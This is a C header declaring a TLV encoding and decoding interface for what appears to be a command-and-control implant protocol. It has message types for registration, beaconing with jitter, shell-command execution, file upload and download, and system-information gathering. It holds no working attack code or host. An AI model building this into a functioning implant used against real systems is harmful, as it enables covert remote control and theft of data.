/* ==========================================================================
 * tlv.h - Type-Length-Value Codec Interface
 * ==========================================================================
 * Wire format for each TLV field:
 *
 *   +------+------+------+------+------+------+-- ... --+
 *   | Type (2B BE)| Length (4B BE)     | Value (L bytes) |
 *   +------+------+------+------+------+------+-- ... --+
 *
 * A message is a sequence of TLV fields.  The entire message is framed by
 * a 4-byte big-endian length prefix (handled at the protocol layer).
 *
 * IMPORTANT: All multi-byte integers are serialized byte-by-byte in
 * big-endian order.  We never cast struct pointers to wire buffers because
 * that would break on architectures with different alignment or endianness.
 * ========================================================================== */
#ifndef TLV_H
#define TLV_H

#include <stdint.h>
#include <stddef.h>

/* ---- TLV header sizes ------------------------------------------------- */
#define TLV_TYPE_SIZE   2   /* bytes for the type field   */
#define TLV_LENGTH_SIZE 4   /* bytes for the length field */
#define TLV_HEADER_SIZE (TLV_TYPE_SIZE + TLV_LENGTH_SIZE) /* 6 bytes total */

/* ---- TLV field type constants ----------------------------------------- */
/* Message-level types (identify the message kind) */
#define TLV_MSG_TYPE        0x0001  /* uint16: message type (REGISTER, etc.) */
#define TLV_SEQUENCE        0x0002  /* uint32: sequence number              */
#define TLV_TIMESTAMP       0x0003  /* int64: Unix timestamp                */

/* Registration fields */
#define TLV_AGENT_ID        0x0010  /* string: agent UUID                   */
#define TLV_HOSTNAME        0x0011  /* string: hostname                     */
#define TLV_OS_INFO         0x0012  /* string: OS description               */
#define TLV_ARCH            0x0013  /* string: CPU architecture             */
#define TLV_AGENT_NAME      0x0014  /* string: agent name (AGENT_NAME)      */
#define TLV_AGENT_VERSION   0x0015  /* string: agent version                */

/* Task / result fields */
#define TLV_TASK_ID         0x0020  /* uint32: task identifier              */
#define TLV_TASK_TYPE       0x0021  /* uint16: task type (exec, upload...)  */
#define TLV_TASK_DATA       0x0022  /* bytes: task payload (command, path)  */
#define TLV_RESULT_STATUS   0x0023  /* int32: result status / exit code     */
#define TLV_RESULT_DATA     0x0024  /* bytes: result payload (output, data) */
#define TLV_FILE_PATH       0x0025  /* string: file path for up/download    */
#define TLV_FILE_DATA       0x0026  /* bytes: file content                  */

/* Beacon fields */
#define TLV_BEACON_INTERVAL 0x0030  /* uint32: current beacon interval (s)  */
#define TLV_JITTER          0x0031  /* uint32: current jitter percentage    */

/* ---- Message types (values for TLV_MSG_TYPE) -------------------------- */
#define MSG_REGISTER    0x0001
#define MSG_BEACON      0x0002
#define MSG_TASK        0x0003
#define MSG_RESULT      0x0004
#define MSG_SHUTDOWN    0x0005
#define MSG_ACK         0x0006  /* Server acknowledgement                   */

/* ---- Task types (values for TLV_TASK_TYPE) ----------------------------- */
#define TASK_EXEC       0x0001  /* Execute a shell command                  */
#define TASK_UPLOAD     0x0002  /* Upload file from agent to server         */
#define TASK_DOWNLOAD   0x0003  /* Download file from server to agent       */
#define TASK_SYSINFO    0x0004  /* Gather system information                */
#define TASK_SLEEP      0x0005  /* Change beacon interval                   */

/* ---- Single decoded TLV field ----------------------------------------- */
typedef struct {
    uint16_t type;      /* Field type (one of TLV_* constants)  */
    uint32_t length;    /* Length of value in bytes              */
    uint8_t *value;     /* Pointer into the decode buffer (not owned) */
} tlv_field_t;

/* ---- Dynamic TLV buffer for building messages ------------------------- */
typedef struct {
    uint8_t *data;      /* Backing buffer (heap-allocated)      */
    size_t   size;      /* Current used bytes                   */
    size_t   capacity;  /* Allocated capacity                   */
} tlv_buffer_t;

/* ---- Encoding functions ----------------------------------------------- */

/**
 * Initialise a TLV buffer with initial capacity `cap` bytes.
 * Returns 0 on success, -1 on allocation failure.
 */
int tlv_buffer_init(tlv_buffer_t *buf, size_t cap);

/**
 * Append a TLV field (type + length + value) to the buffer.
 * The buffer grows automatically if needed.
 * Returns 0 on success, -1 on failure.
 */
int tlv_buffer_add(tlv_buffer_t *buf, uint16_t type,
                   uint32_t length, const void *value);

/**
 * Convenience: append a uint16 value as a TLV field.
 */
int tlv_buffer_add_u16(tlv_buffer_t *buf, uint16_t type, uint16_t val);

/**
 * Convenience: append a uint32 value as a TLV field.
 */
int tlv_buffer_add_u32(tlv_buffer_t *buf, uint16_t type, uint32_t val);

/**
 * Convenience: append an int64 value as a TLV field.
 */
int tlv_buffer_add_i64(tlv_buffer_t *buf, uint16_t type, int64_t val);

/**
 * Convenience: append a NUL-terminated string as a TLV field.
 * The NUL terminator is NOT included in the wire value.
 */
int tlv_buffer_add_str(tlv_buffer_t *buf, uint16_t type, const char *str);

/**
 * Free the backing buffer.  The tlv_buffer_t struct itself is NOT freed
 * (it is typically stack-allocated).
 */
void tlv_buffer_free(tlv_buffer_t *buf);

/* ---- Decoding functions ----------------------------------------------- */

/**
 * Decode a single TLV field from `data` (of `data_len` bytes available).
 * On success, fills `*field` and returns the total number of bytes consumed
 * (TLV_HEADER_SIZE + field->length).
 * On failure (truncated data, oversized length), returns -1.
 *
 * NOTE: field->value points directly into `data`; it does not copy.
 */
int tlv_decode(const uint8_t *data, size_t data_len, tlv_field_t *field);

/**
 * Decode all TLV fields from `data` (of `data_len` bytes).
 * Allocates an array of tlv_field_t and stores it in `*fields`.
 * Stores the count in `*count`.  Caller must free `*fields`.
 * Returns 0 on success, -1 on failure.
 */
int tlv_decode_all(const uint8_t *data, size_t data_len,
                   tlv_field_t **fields, size_t *count);

/**
 * Search decoded fields for the first field matching `type`.
 * Returns a pointer to the field, or NULL if not found.
 */
const tlv_field_t *tlv_find_field(const tlv_field_t *fields, size_t count,
                                  uint16_t type);

/* ---- Wire-format helpers ---------------------------------------------- */

/**
 * Write a uint16 in big-endian into buf (must have >= 2 bytes).
 */
void tlv_write_u16_be(uint8_t *buf, uint16_t val);

/**
 * Write a uint32 in big-endian into buf (must have >= 4 bytes).
 */
void tlv_write_u32_be(uint8_t *buf, uint32_t val);

/**
 * Read a uint16 from big-endian bytes.
 */
uint16_t tlv_read_u16_be(const uint8_t *buf);

/**
 * Read a uint32 from big-endian bytes.
 */
uint32_t tlv_read_u32_be(const uint8_t *buf);

/**
 * Read an int64 from big-endian bytes.
 */
int64_t tlv_read_i64_be(const uint8_t *buf);

#endif /* TLV_H */
